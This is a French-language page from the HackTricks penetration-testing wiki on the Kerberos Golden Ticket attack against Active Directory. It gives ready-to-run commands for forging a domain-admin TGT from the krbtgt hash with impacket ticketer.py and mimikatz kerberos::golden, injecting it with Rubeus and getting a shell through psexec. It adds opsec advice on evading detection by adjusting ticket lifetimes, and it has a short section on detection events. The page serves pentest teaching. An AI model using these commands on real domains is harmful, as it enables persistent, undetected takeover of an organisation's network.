## Ticket d'or

Un **TGT valide en tant que n'importe quel utilisateur** peut être créé **en utilisant le hachage NTLM du compte AD krbtgt**. L'avantage de forger un TGT au lieu d'un TGS est de pouvoir accéder à n'importe quel service (ou machine) dans le domaine et à l'utilisateur impersonné.\
De plus, les **informations d'identification** de **krbtgt** ne sont **jamais** **modifiées** automatiquement.

Le hachage NTLM du compte **krbtgt** peut être **obtenu** à partir du processus **lsass** ou du fichier **NTDS.dit** de n'importe quel DC dans le domaine. Il est également possible d'obtenir ce hachage NTLM grâce à une attaque **DCsync**, qui peut être effectuée soit avec le module [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) de Mimikatz, soit avec l'exemple impacket [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Généralement, des **privilèges d'administrateur de domaine ou similaires sont requis**, quelle que soit la technique utilisée.

Il convient également de prendre en compte qu'il est possible ET **PRÉFÉRABLE** (opsec) de **forger des tickets en utilisant les clés Kerberos AES (AES128 et AES256)**.

{% code title="Depuis Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Depuis Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

Une fois que vous avez injecté le **golden ticket**, vous pouvez accéder aux fichiers partagés **(C$)** et exécuter des services et WMI, vous pouvez donc utiliser **psexec** ou **wmiexec** pour obtenir un shell (il semble que vous ne pouvez pas obtenir un shell via winrm).

### Contournement des détections courantes

Les moyens les plus fréquents de détecter un golden ticket consistent à **inspecter le trafic Kerberos** sur le fil. Par défaut, Mimikatz **signe le TGT pour 10 ans**, ce qui ressortira comme anormal dans les demandes TGS ultérieures effectuées avec celui-ci.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utilisez les paramètres `/startoffset`, `/endin` et `/renewmax` pour contrôler le décalage de début, la durée et le nombre maximal de renouvellements (tous en minutes).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Malheureusement, la durée de vie du TGT n'est pas enregistrée dans les événements 4769, vous ne trouverez donc pas cette information dans les journaux d'événements Windows. Cependant, ce que vous pouvez corréler, c'est de **voir des événements 4769 sans** _**précédent 4768**_. Il n'est **pas possible de demander un TGS sans un TGT**, et s'il n'y a pas d'enregistrement d'un TGT émis, nous pouvons en déduire qu'il a été forgé hors ligne.

Afin de **contourner cette détection**, vérifiez les tickets diamant :

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Atténuation

* 4624 : Ouverture de session de compte
* 4672 : Ouverture de session d'administrateur
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

D'autres astuces que les défenseurs peuvent faire est d'**alerter sur les événements 4769 pour les utilisateurs sensibles** tels que le compte administrateur de domaine par défaut.

[**Plus d'informations sur Golden Ticket dans ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au repo [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
